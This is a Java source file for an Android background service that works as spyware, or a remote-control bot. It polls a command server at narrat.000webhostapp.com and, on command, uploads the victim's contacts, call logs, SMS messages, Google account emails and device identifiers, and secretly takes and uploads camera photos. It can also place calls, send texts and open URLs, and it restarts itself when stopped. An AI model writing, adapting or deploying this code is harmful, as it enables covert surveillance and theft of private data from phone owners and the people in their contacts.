package com.example.nyadav.service;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.PictureDrawable;
import android.hardware.Camera;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Binder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceView;
import android.widget.Toast;

import junit.runner.Version;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

public class MyService extends Service {
    int ts;
    String TAG;
    boolean havetoupdate = true;



    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //********************************************************************************************************************************************************




    @Override
    public void onCreate() {
        super.onCreate();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {

        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("havetoupdate", true).commit();
        if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "") == "" )
        {
            TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
            String andId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            String deviceId = tMgr.getDeviceId() + andId;
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("deviceid", deviceId).commit();
        }




        ts = 0;


        if(!thread.isAlive()){
            thread.start();
        }
        else {
            Log.d("thread", "thread already started");
        }

    return START_STICKY;
    }





    //***********************************************************************************************************************************************************************************************


    Thread thread = new Thread()
    {
        @Override
        public void run() {
            Looper.prepare();
            Log.d("threads", "thread running");



            while (true && ts == 0){
                String function = "";
                if(isNetworkAvailable()) {


                    if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("havetoupdate", true)) {
                        new updatebotc().execute();
                    }


                    //go to loop.php and get functions and set online
                    try {
                        function = downloadUrl("http://narrat.000webhostapp.com/getfunction.php?UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", ""));
                        Log.d("connected and data = ", function);
                        Log.d("value of device id", PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", ""));


                    } catch (IOException e) {
                        Log.d("connectionf url", "Unable to connect to net");

                    }


                    if (function.contains("NYnofunction")) {

                        Log.d(TAG, "No command received");

                    }

                    else if (function.contains("NYgetcontacts")) {
                        Log.d(TAG, "We have to send contacts");
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        new getContacts().execute(perm);
                    }

                    else if (function.contains("NYgetcalllogs")) {
                        Log.d(TAG, "We have to send call logs");
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        new getCallLogs().execute(perm);
                    }



                    else if (function.contains("NYmaketoast")) {
                        Log.d("toast msg:", function);
                        String toastmsg = function.substring(function.lastIndexOf("(") + 1) ;
                        final String xtoastmsg = toastmsg.substring(0, toastmsg.indexOf(")"));
                        Handler handler = new Handler(Looper.getMainLooper());
                        handler.post(new Runnable() {

                            @Override
                            public void run() {
                                Toast.makeText(getApplicationContext(), xtoastmsg, Toast.LENGTH_LONG).show();
                            }
                        });


                    }


                    else if (function.contains("NYmakevibrate")) {
                        Log.d(TAG, "We have to vibrate");
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        new makeVibrate().execute(perm);


                    } else if (function.contains("NYsetbackground")) {
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        Log.d(TAG, "We have to change background with " + perm);
                        new setBackground().execute(perm);


                    } else if (function.contains("NYmakecall")) {
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        Log.d(TAG, "We have to make a call  to " + perm);

                        Intent intent = new Intent(Intent.ACTION_CALL);
                        intent.setData(Uri.parse("tel:" + perm));
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        getApplicationContext().startActivity(intent);

                    } else if (function.contains("NYmute")) {

                        Log.d(TAG, "MUTED");

                        AudioManager audioManager = (AudioManager)getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
                        audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);

                    } else if (function.contains("NYvibrate")) {

                        Log.d(TAG, "VIBRATE");

                        AudioManager audioManager = (AudioManager)getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
                        audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
                    } else if (function.contains("NYsound")) {
                        Log.d(TAG, "SOUND");

                        AudioManager audioManager = (AudioManager)getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
                        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);

                        audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                        audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, AudioManager.FLAG_SHOW_UI + AudioManager.FLAG_PLAY_SOUND);

                    } else if (function.contains("NYsendsms")) {
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));

                        String perm2 = function.substring(function.indexOf("<") + 1);
                        perm2 = perm2.substring(0, perm2.indexOf(">"));



                        Log.d(TAG, "send sms" + perm2 + "to" + perm);
                        new sendsms().execute(perm, perm2);

                    } else if (function.contains("NYopenurl")) {

                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));

                        String url = perm;
                        if (!url.startsWith("http://") && !url.startsWith("https://"))
                            url = "http://" + url;
                        Log.d(TAG, "opening " + url);
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                        startActivity(browserIntent);

                    } else if (function.contains("NYgetwallpaper")) {

                        Log.d(TAG, "upload wallpaper");

                        final WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
                        final Drawable wallpaperDrawable = wallpaperManager.getDrawable();
                        Bitmap img = drawableToBitmap(wallpaperDrawable);

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                        String currentDateandTime = sdf.format(new Date());
                        currentDateandTime = currentDateandTime.replace(" ","_");


                        String filename = getApplicationContext().getFilesDir().getPath().toString() + "/bgimage"+currentDateandTime+".jpg";
                        FileOutputStream out = null;
                        try {
                            out = new FileOutputStream(filename);
                            img.compress(Bitmap.CompressFormat.PNG, 100, out); // bmp is your Bitmap instance
                            // PNG is a lossless format, the compression factor (100) is ignored
                        } catch (Exception e) {
                            e.printStackTrace();
                        } finally {
                            try {
                                if (out != null) {
                                    out.close();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }


                        new UploadFile().execute(filename);

                    } else if (function.contains("NYtakephoto")) {

                        Log.d(TAG, "we have to send photo");

                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));

                        new takePic().execute(perm);

                    } else if (function.contains("NYgetsms")) {
                        String perm = function.substring(function.indexOf("(") + 1);
                        perm = perm.substring(0, perm.indexOf(")"));
                        Log.d(TAG, "we have to send " + perm + " SMS");


                        new getSms().execute(perm);

                    } else if (function.contains("o")) {

                        Log.d(TAG, "function contains a");

                    } else if (function.contains("p")) {

                        Log.d(TAG, "function contains p");

                    } else if (function.contains("q")) {

                        Log.d(TAG, "function contains q");

                    } else if (function.contains("r")) {

                        Log.d(TAG, "function contains r");

                    } else if (function.contains("s")) {

                        Log.d(TAG, "function contains s");

                    } else if (function.contains("t")) {

                        Log.d(TAG, "function contains t");

                    } else if (function.contains("u")) {

                        Log.d(TAG, "function contains u");

                    } else if (function.contains("v")) {

                        Log.d(TAG, "function contains v");

                    } else if (function.contains("w")) {

                        Log.d(TAG, "function contains w");

                    } else if (function.contains("x")) {

                        Log.d(TAG, "function contains x");

                    } else if (function.contains("y")) {

                        Log.d(TAG, "function contains y");

                    } else if (function.contains("z")) {

                        Log.d(TAG, "function contains z");

                    }
                }

                else {
                    Log.d("network status", "No network available");
                }


                try
                {
                    Log.d("threads", "thread sleeping");
                    Thread.sleep(4000);

                }
                catch (Exception e)
                {
                    thread.start();

                }

            }
            Log.d("thread", "stop");


        }

    };

    //functions implimentations

    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //NETWORKINF FUNCTIONS





    //Check for data connection availablity
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }



    private String downloadUrl(String myurl) throws IOException {
        InputStream is = null;



        try {


            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();


            // Starts the query
            conn.connect();
            int response = conn.getResponseCode();
            Log.d("GET RESPONSE:", "The response is: " + response);

            is = conn.getInputStream();

            // Convert the InputStream into a string
            String contentAsString = readIt(is);
            return contentAsString;

            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {
            if (is != null) {
                is.close();

            }

        }
    }


    // Reads an InputStream and converts it to a String.
    public String readIt(InputStream stream) throws IOException, UnsupportedEncodingException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(stream, "UTF-8"));
        String webPage = "",data="";

        while ((data = reader.readLine()) != null){
            webPage += data + "\n";
        }
        return webPage;
    }






    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    // ACTION FUNCTIONS



    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    // UPDATE BOT
    private String emails = "";
    public class updatebotc extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            updatebot();
            return "Executed";
        }



        public void updatebot(){

            TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
            String deviceId = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "");

            String deviceIda = deviceId.replace(' ' , '_');
            String brand = Build.MANUFACTURER;
            String branda = brand.replace(' ' , '_');
            String model = android.os.Build.MODEL;
            String modela = model.replace(' ' , '_');
            String androidOS = Build.VERSION.RELEASE;
            String androidOSa = androidOS.replace(' ' , '_');
            String sdk = String.valueOf(Integer.valueOf(Build.VERSION.SDK_INT));
            String sdka = sdk.replace(' ' , '_');
            String provider = removeBlankSpace(new StringBuilder(tMgr.getNetworkOperatorName()));
            String providera = provider.replace(' ' , '_');
            getUsername();



            String updaturl = "http://narrat.000webhostapp.com/updatebot.php?UID="+deviceIda+"&brand="+branda+"&model="+modela+"&aos="+androidOSa+"&sdk="+sdka+"&isp="+providera+"&emails="+emails;
            try {

                String updresult = downloadUrl(updaturl);
                Log.d("updating by", updaturl);
                Log.d("result", updresult);

                if(updresult.contains("updatedbot")){

                    Log.d(TAG, "BOT UPDATED");
                    PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("havetoupdate", false).commit();

                }





            } catch (IOException e) {
                e.printStackTrace();
            }


        }

        public String removeBlankSpace(StringBuilder sb) {
            int j = 0;
            for(int i = 0; i < sb.length(); i++) {
                if (!Character.isWhitespace(sb.charAt(i))) {
                    sb.setCharAt(j++, sb.charAt(i));
                }
            }
            sb.delete(j, sb.length());
            return sb.toString();
        }

    }
    public void getUsername() {
        emails = "";
        AccountManager manager = AccountManager.get(this);
        Account[] accounts = manager.getAccountsByType("com.google");

        for (Account account : accounts) {
            emails = emails.concat(account.name + "_");
        }


    }

    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    // GET CONTACTS

    public class getContacts extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            Log.d(TAG, params[0]);
            int num = Integer.parseInt(params[0]);
            if (num == 0)
                num = -1;
            getC(num);
            return "Executed";
        }



        protected void getC(int num){

            // get and upload contacts
            int i = 1;
            int n = num;
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
            while (cursor.moveToNext()) {
                try{
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor phones = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
                        while (phones.moveToNext() && (i != n) ) {
                            String phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                            HashMap<String,String> map=new HashMap<String,String>();
                            map.put("name", name);
                            map.put("number", phoneNumber);


                            String stringUrl = "http://narrat.000webhostapp.com/updata/upcontacts.php?conname="+name.replaceAll(" ","_")+"&connumber="+phoneNumber.replaceAll(" ","_");
                            Log.d(TAG, "Executing :"+ stringUrl);
                            downloadUrl(stringUrl);
                            i++;

                        }

                        phones.close();
                    }
                }catch(Exception e){}
            }

            try {
                String stringUrl = "http://narrat.000webhostapp.com/updatecmdflag.php?UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "").replaceAll(" ","_");
                downloadUrl(stringUrl);
            } catch (IOException e) {
                e.printStackTrace();
            }

        }


    }



    public class makeVibrate extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            int sec = Integer.parseInt(params[0])* 1000;
            Vibrator vibrator;
            vibrator = (Vibrator)getSystemService(Context.VIBRATOR_SERVICE);
            vibrator.vibrate(sec);
            return  "ececuted";
        }


    }







    public class setBackground extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            String imageUrl = params[0];
            String destinationFile = getApplicationContext().getFilesDir().getPath().toString() + "/bgimage.jpg";
            Log.d(TAG, destinationFile);
            try {
                saveImage(imageUrl, destinationFile);
            } catch (IOException e) {
                e.printStackTrace();
            }

            String fileName = destinationFile;
            File file = new File(fileName);


            WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
            Bitmap wallpaper = BitmapFactory.decodeFile(file.getAbsolutePath());
            try {
                wallpaperManager.setBitmap(wallpaper);
            } catch (IOException e) {
                e.printStackTrace();
            }


            return  "executed";
        }

        public void saveImage(String imageUrl, String destinationFile) throws IOException {
            URL url = new URL(imageUrl);
            InputStream is = url.openStream();
            OutputStream os = new FileOutputStream(destinationFile);

            byte[] b = new byte[2048];
            int length;

            while ((length = is.read(b)) != -1) {
                os.write(b, 0, length);
            }

            is.close();
            os.close();
        }


    }





    public class sendsms extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            String pn = params[0];
            String msg = params[1];
            Log.d(TAG, "sent sms " + msg + " to " + pn);


            try {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(pn, null, msg, null, null);
                Log.d(TAG, "sent sms " + msg + " to " + pn);

            } catch (Exception ex) {
                Log.d(TAG, "xxxxoooppps");
                ex.printStackTrace();
            }
            return  "ececuted";
        }


    }



    public class UploadFile extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {

            try {
                String sourceFileUri = params[0];

                HttpURLConnection conn = null;
                DataOutputStream dos = null;
                String lineEnd = "\r\n";
                String twoHyphens = "--";
                String boundary = "*****";
                int bytesRead, bytesAvailable, bufferSize;
                byte[] buffer;
                int maxBufferSize = 1 * 1024 * 1024;
                File sourceFile = new File(sourceFileUri);

                if (sourceFile.isFile()) {

                    try {
                        String deviceId = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "");
                        String upLoadServerUri = "http://narrat.000webhostapp.com/uploadfile.php?uid="+deviceId+"&";

                        // open a URL connection to the Servlet
                        FileInputStream fileInputStream = new FileInputStream(
                                sourceFile);
                        URL url = new URL(upLoadServerUri);

                        // Open a HTTP connection to the URL
                        conn = (HttpURLConnection) url.openConnection();
                        conn.setDoInput(true); // Allow Inputs
                        conn.setDoOutput(true); // Allow Outputs
                        conn.setUseCaches(false); // Don't use a Cached Copy
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("Connection", "Keep-Alive");
                        conn.setRequestProperty("ENCTYPE",
                                "multipart/form-data");
                        conn.setRequestProperty("Content-Type",
                                "multipart/form-data;boundary=" + boundary);
                        conn.setRequestProperty("bill", sourceFileUri);

                        dos = new DataOutputStream(conn.getOutputStream());

                        dos.writeBytes(twoHyphens + boundary + lineEnd);
                        dos.writeBytes("Content-Disposition: form-data; name=\"bill\";filename=\""
                                + sourceFileUri + "\"" + lineEnd);

                        dos.writeBytes(lineEnd);

                        // create a buffer of maximum size
                        bytesAvailable = fileInputStream.available();

                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
                        buffer = new byte[bufferSize];

                        // read file and write it into form...
                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                        while (bytesRead > 0) {

                            dos.write(buffer, 0, bufferSize);
                            bytesAvailable = fileInputStream.available();
                            bufferSize = Math
                                    .min(bytesAvailable, maxBufferSize);
                            bytesRead = fileInputStream.read(buffer, 0,
                                    bufferSize);

                        }

                        // send multipart form data necesssary after file
                        // data...
                        dos.writeBytes(lineEnd);
                        dos.writeBytes(twoHyphens + boundary + twoHyphens
                                + lineEnd);

                        // Responses from the server (code and message)
                        int serverResponseCode = conn.getResponseCode();
                        String serverResponseMessage = conn
                                .getResponseMessage();

                        if (serverResponseCode == 200) {

                            // messageText.setText(msg);
                            //Toast.makeText(ctx, "File Upload Complete.",
                            //      Toast.LENGTH_SHORT).show();

                            // recursiveDelete(mDirectory1);

                        }

                        // close the streams //
                        fileInputStream.close();
                        dos.flush();
                        dos.close();

                    } catch (Exception e) {

                        // dialog.dismiss();
                        e.printStackTrace();

                    }
                    // dialog.dismiss();

                } // End else block


            } catch (Exception ex) {
                // dialog.dismiss();

                ex.printStackTrace();
            }
            return params[0];
        }

        @Override
        protected void onPostExecute(String result) {
            new File(result).delete();

        }

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected void onProgressUpdate(Void... values) {
        }
    }










    public class getCallLogs extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            Log.d(TAG, params[0]);
            int num = Integer.parseInt(params[0]);
            if (num == 0)
                num = -1;

            try {
                getCallL(num);
            } catch (IOException e) {
                e.printStackTrace();
            }

            return "Executed";
        }


        private String getCallL(int num) throws IOException {
            int i = 1;
            int n = num;
            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
            StringBuffer sb = new StringBuffer();
            Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                    null, null, strOrder);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");
            while (managedCursor.moveToNext() && (i != n) ) {
                String clname = managedCursor.getString(name);
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String cltime = callDayTime.toString();
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                if (clname == null){
                    clname = "NULL";
                }

                if (dir == null){
                    dir = "NULL";
                }

                if (phNumber == null){
                    phNumber = "NULL";
                }

                if (cltime == null){
                    clname = "NULL";
                }

                if (callDuration == null){
                    clname = "NULL";
                }


                String dataUrl = "http://narrat.000webhostapp.com/updata/upcalllogs.php?clname=" + clname.replaceAll(" ","_") + "&clnumber=" + phNumber.replaceAll(" ","_") + "&cltype=" + dir.replaceAll(" ","_") +"&cltime=" + cltime.replaceAll(" ","_") + "&clduration=" + callDuration.replaceAll(" ","_");
                Log.d("Servuice", "Executing :"+ dataUrl);
                downloadUrl(dataUrl);
                i++;

            }
            managedCursor.close();

            try {
                String stringUrl = "http://narrat.000webhostapp.com/updatecmdflag.php?UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "").replaceAll(" ","_");
                downloadUrl(stringUrl);
            } catch (IOException e) {
                e.printStackTrace();
            }

            return sb.toString();

        }


    }





    public class getSms extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            Log.d(TAG, params[0]);
            int num = Integer.parseInt(params[0]);
            if (num == 0)
                num = -1;


                getmsgs(num);


            return "Executed";
        }




        @TargetApi(Build.VERSION_CODES.KITKAT)
        public void getmsgs(int num){
            Log.d(TAG, (String.valueOf(num)));
            int n = num;
            int i = 1;
            ContentResolver cr = getApplicationContext().getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    for (int j = 0; j < totalSMS  && (i != n); j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        Date dateFormat= new Date(Long.valueOf(smsDate));
                        String dateF = dateFormat.toString();
                        String type = "Unknown";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                                type = "Draft";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                type = "outbox";
                                break;
                            default:
                                break;
                        }


                        Log.d(TAG,  number + "   \n" + body + "   \n" + dateFormat + "   \n" + type);

                        if (number == null){
                            number = "NULL";
                        }
                        if (body == null){
                            body = "NULL";
                        }
                        if (dateF == null){
                            dateF = "NULL";
                        }
                        if (type == null){
                            type = "NULL";
                        }

                        String dataUrl = "http://narrat.000webhostapp.com/updata/upmsg.php?msgnumber=" + number.replaceAll(" ","_") + "&msgbody=" + body.replaceAll(" ","_") + "&msgtype=" + type.replaceAll(" ","_") +"&msgtime=" + dateF.replaceAll(" ","_");
                        Log.d("Servuice", "Executing :"+ dataUrl);
                        Log.d(TAG, "\n\n\n"+(String.valueOf(i)));

                        try {
                            downloadUrl(dataUrl);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        i++;
                        c.moveToNext();

                    }
                }
            } else {
                Log.d(TAG, "No sms");
            }

            try {
                String stringUrl = "http://narrat.000webhostapp.com/updatecmdflag.php?UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("deviceid", "").replaceAll(" ","_");
                downloadUrl(stringUrl);
            } catch (IOException e) {
                e.printStackTrace();
            }

        }




    }





    public static Bitmap drawableToBitmap (Drawable drawable) {
        Bitmap bitmap = null;

        if (drawable instanceof BitmapDrawable) {
            BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
            if(bitmapDrawable.getBitmap() != null) {
                return bitmapDrawable.getBitmap();
            }
        }

        if(drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
            bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
        } else {
            bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
        }

        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmap;
    }








    public class takePic extends AsyncTask<String, Void, String> {
        public Camera camera;
        @Override
        protected String doInBackground(String... params) {

            //takeSnapShots();
            String i = params[0];
            int numCameras = Camera.getNumberOfCameras();
            if (numCameras > Integer.parseInt(i)) {
                Intent intent = new Intent(getApplicationContext(), CameraView.class);
                Log.i("com.connect", "I: " + i);
                intent.putExtra("Camera", i);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                //startActivity(intent);
                try {
                    takepic(i);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
            return "Executed";
        }

        public void takepic (String i) throws InterruptedException {
            Log.d(TAG, "cameraid "+ i);
            int cam = Integer.parseInt(i);


            if (true){

                camera = Camera.open(cam);
                try {
                    camera.setPreviewTexture(new SurfaceTexture(10));
                } catch (IOException e1) {
                    Log.i("CAMERA", "cant set preview texture");
                }

                Log.i("CAMERA", "surfacetexture creata correttamente");
                Camera.Parameters params = camera.getParameters();
                params.setPreviewSize(640, 480);
                Log.i("CAMERA", "preview impostata");
                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                Log.i("CAMERA", "flash impostato");
                params.setPictureFormat(ImageFormat.JPEG);
                params.setJpegQuality(30);
                Log.i("CAMERA", "formato impostato");
                camera.setParameters(params);
                Log.i("CAMERA", "parametri inviati alla fotocamera");
                camera.startPreview();
                Log.i("CAMERA", "mi metto a dormire");
                Thread.sleep(3000);
                Log.i("CAMERA", "la preview � pronta; mi sveglio");
                camera.takePicture(null, null, null, new PhotoHandler(getApplicationContext()));


                //camera.startPreview();

//                try {
//
//                    Thread.sleep(2000);
//                } catch (InterruptedException e) {
//                    e.printStackTrace();
//                }
//
//                camera.takePicture(null, null, new PhotoHandler(getApplicationContext()));
//
                try {

                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                camera.release();

            }


        }


        public boolean isCamava() {
            Camera cameraxx = null;
            try {
                cameraxx = Camera.open();
            } catch (RuntimeException e) {
                return true;
            } finally {
                if (cameraxx != null) cameraxx.release();
            }
            return false;
        }


        public class PhotoHandler implements Camera.PictureCallback {




            private final Context context;

            public PhotoHandler(Context context) {
                this.context = context;
            }

            @Override
            public void onPictureTaken(byte[] data, Camera camera) {


                File fldr = new File(Environment.getExternalStorageDirectory() +
                        File.separator + "Pictures");
                boolean success = true;
                if (!fldr.exists())
                    fldr.mkdirs();


                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String date = dateFormat.format(new Date());
                String photoFile = "Picture_" + date + ".jpg";
                String picfilename = fldr + File.separator + photoFile;
                File pictureFile = new File(picfilename);



                try {
                    FileOutputStream fos = new FileOutputStream(pictureFile);
                    fos.write(data);
                    fos.close();
                    Log.d(TAG, "picture have been saved");
                    new UploadFile().execute(picfilename);
                } catch (Exception error) {

                }
            }


        }


    }








    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    //**************************************************************************************************************************************************************************************
    @Override
    public void onDestroy() {
        ts = 1;

        startService(new Intent(this, MyService.class ));
    }
}
